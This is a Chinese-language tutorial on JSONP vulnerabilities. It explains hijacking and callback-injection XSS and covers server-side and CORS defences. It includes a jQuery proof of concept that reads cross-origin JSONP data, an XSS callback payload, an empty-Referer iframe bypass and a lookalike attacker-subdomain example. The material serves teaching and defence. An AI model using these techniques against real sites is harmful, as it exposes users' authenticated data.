JSONP 漏洞
====================

基本概念
--------

什么是 JSONP？
~~~~~~~~~~~~~~
JSONP (JSON with Padding) 是一种用于解决浏览器同源策略限制的跨域数据获取技术。其核心原理是利用 ``<script>`` 标签不受同源策略限制的特性，通过动态创建脚本标签从不同域获取 JSON 数据。

工作流程
^^^^^^^^
+ 1. 客户端定义回调函数: ``function handleData(data) { ... }``
+ 2. 创建动态脚本标签: ``<script src="https://api.example.com/data?callback=handleData">``
+ 3. 服务端返回包装后的数据: ``handleData({"user":"admin","email":"admin@example.com"});``
+ 4. 客户端自动执行回调函数处理数据

漏洞原理
--------

核心安全问题-设计特性
~~~~~~~~~~~~~~~~~~~~~
+ 1. 自动携带凭据
	- 浏览器会在 JSONP 请求中自动发送目标域的 Cookies
	- 包括身份验证会话 (Session ID)

+ 2. 缺乏内置安全机制
	- 无 CORS 式的源验证
	- 依赖开发者手动实现安全控制

+ 3. 动态脚本执行
	- 服务端响应作为脚本直接执行
	- 允许攻击者控制回调函数

漏洞利用场景
------------

攻击类型 1: JSONP 劫持
~~~~~~~~~~~~~~~~~~~~~~~

攻击步骤
^^^^^^^^
+ 常见接口
	::
	
		callback=attack
		cb=attack
		call=attack
		jsonp=attack
		jsonpcallback=attack
		jsonpcb=attack
		json=attack
		jsoncallback=attack
		jcb=attack

+ 示例
	- 接口: ``http://www.xxx.com/interface?callback=attack``
	- 返回数据: ``attack({"value":1})``
+ 构造POC
	::
	
		<!DOCTYPE html>
		<html lang="en">
		<head>
			<meta charset="UTF-8">
			<title>jsonp劫持</title>
			<script src="js/jquery.min.js"></script>
		</head>
		<body>
		<script type="text/javascript">
			$.ajax({
				url:"http://xxx.com/interface",
				dataType:"jsonp",
				jsonp:"callback",
				jsonpCallback:"attack",
				success:function (data) {
					alert(data.value)
				}
			})
		</script>
		</body>
		</html>
		
		注意：
		jquery.min.js需要在https://jquery.com官网下载，放在当前js目录下
		jsonp 填写回调参数的名字
		jsonpcallback 就是回调参数的值
		alert 的地方根据需要更改取值
		如果能正常取到值，就说明漏洞存在了

攻击类型 2: JSONP XSS
~~~~~~~~~~~~~~~~~~~~~
当回调函数名未过滤时，可注入任意代码::

  https://victim.com/api?callback=alert(document.domain)//

服务端返回::

  alert(document.domain)//({"data": "value"});

导致 XSS 漏洞执行

现代浏览器防护
--------------

安全改进措施
~~~~~~~~~~~~

+----------------------+-----------------------------------------------+
| 防护机制             | 防护效果                                      |
+======================+===============================================+
| Strict Referer Policy| 跨域请求时移除 URL 路径和参数                 |
+----------------------+-----------------------------------------------+
| Default CORS         | 成为跨域请求标准解决方案                      |
+----------------------+-----------------------------------------------+
| Content-Type 校验    | 阻止浏览器将响应解析为脚本                    |
+----------------------+-----------------------------------------------+

绕过技术示例
~~~~~~~~~~~~~
1. 空 Referer 利用::

    <iframe src="javascript:'<script>function steal(){...}</script><script src=...></script>'"></iframe>

2. 宽松正则绕过::

    合法域名: api.example.com
    绕过域名: api.attacker.example.com

3. 子域接管攻击

防御措施
--------

服务器端防护
~~~~~~~~~~~~
.. code-block:: python

    # 严格 Referer 检查
    valid_domains = ['https://trusted.com', 'https://app.trusted.com']
    if request.headers.get('Referer') not in valid_domains:
        return Response("Forbidden", status=403)

    # 回调函数名过滤
    import re
    callback = request.args.get('callback', '')
    if not re.match(r'^[a-zA-Z0-9_\.]+$', callback):
        return Response("Invalid callback", status=400)

客户端防护
~~~~~~~~~~
1. 弃用 JSONP，改用 CORS::

    // 服务端设置
    Access-Control-Allow-Origin: https://trusted.com
    Access-Control-Allow-Credentials: true

2. 敏感操作使用 POST + CSRF Token

漏洞验证工具
------------
.. list-table:: JSONP 测试工具
   :header-rows: 1

   * - 工具名称
     - 用途
   * - Burp Suite
     - 自动检测 JSONP 端点
   * - JSONP Hunter
     - 自动化漏洞验证
   * - Custom Script
     - 手动验证回调控制

.. code-block:: bash

    # 使用 curl 测试
    curl -I "https://victim.com/api?callback=test"
    # 检查响应头中是否存在安全控制
    常见的CORS响应头及其作用：
    Access-Control-Allow-Origin ：指明哪些源可以访问资源。如果该头的值设置为 * ，则允许所有源访问资源，但不包括携带凭证（如cookies）的请求。
    Access-Control-Allow-Methods ：指明服务器支持的跨域请求方法，如 GET 、 POST 等。
    Access-Control-Allow-Headers ：指明哪些自定义头字段是允许的。
    Access-Control-Allow-Credentials ：当设置为 true 时，表明浏览器可以携带凭证信息（如cookies）进行跨源请求。
    Access-Control-Expose-Headers ：指示哪些响应头可以被浏览器读取

结论
----
+ 1. JSONP 漏洞在 **2025 年仍然存在**，但主要影响：
	- 未实施正确防护的遗留系统
	- 实现存在缺陷的新系统
+ 2. 现代浏览器默认安全策略已大幅降低攻击成功率
+ 3. 推荐解决方案：
	- 新系统使用 CORS 替代 JSONP
	- 旧系统强化 Referer 检查和回调过滤
	- 敏感数据接口禁用 JSONP

参考资源
--------
- OWASP JSONP 安全指南: https://owasp.org/jsonp
- CORS vs JSONP 对比: https://web.dev/cors-vs-jsonp